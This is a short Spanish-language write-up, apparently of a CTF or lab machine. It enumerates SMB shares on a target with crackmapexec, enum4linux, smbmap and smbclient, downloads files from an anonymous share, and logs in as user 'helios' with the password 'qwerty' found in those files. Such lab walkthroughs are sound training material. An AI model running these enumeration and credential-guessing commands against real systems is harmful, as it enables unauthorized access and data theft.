Enumeraciones que podemos llevar a cabo con distintas herramientas:

```
crackmapexec smb <IP_VICTIMA>
```


```
enum4linux -a 172.17.0.3
```

Vamos a listar los recursos compartidos de la maquina:
```
smbmap -H <IP_VICTIMA>
```
![[Pasted image 20250701201307.png]]

O

```
smbclient -L //<IP_VICTIMA> -N
```

Vemos un recurso llamado "Helios personal share", por lo tanto podemos creer que Helios es un usuario potencial del sistema.
Ahora, intentaremos listar de forma recursiva los directorios compartidos, en los cuales tengamos permisos de lectura sin proporcionar credenciales.
```
smbmap -H <IP_VICTIMA> -r anonymous
```
![[Pasted image 20250701202424.png]]
Los archivos que aquí encontremos, nos los descargaremos con el siguiente comando:
```
smbmap -H <IP_VICTIMA> --download anonymous/attention.txt
```
![[Pasted image 20250701202857.png]]

Vemos contraseñas posibles, las cuales usaremos para intentar conectarnos a algun recurso compartido como el usuario Helios:

```
smbmap -H <IP_VICTIMA> -u helios -p qwerty
```

o

```
smbclient //<IP_VICTIMA>/helios -U helios --password qwerty
```
La contraseña que dio resultados es "qwerty"

![[Pasted image 20250701205251.png]]

Ahora vamos a listar de forma recursiva el contenido del recurso compartido "helios"

```
smbmap -H <IP_VICTIMA> -u helios -p qwerty -r helios
```
![[Pasted image 20250701205515.png]]

Vamos a descargarnos todos los archivos del recurso compartido:

```
smbmap -H <IP_VICTIMA> -u helios -p qwerty --download helios/research.txt
smbmap -H <IP_VICTIMA> -u helios -p qwerty --download helios/todo.txt
```

![[Pasted image 20250701210015.png]]

Vemos una ruta /h3l105 muy probablemente del servidor web para continuar con la máquina.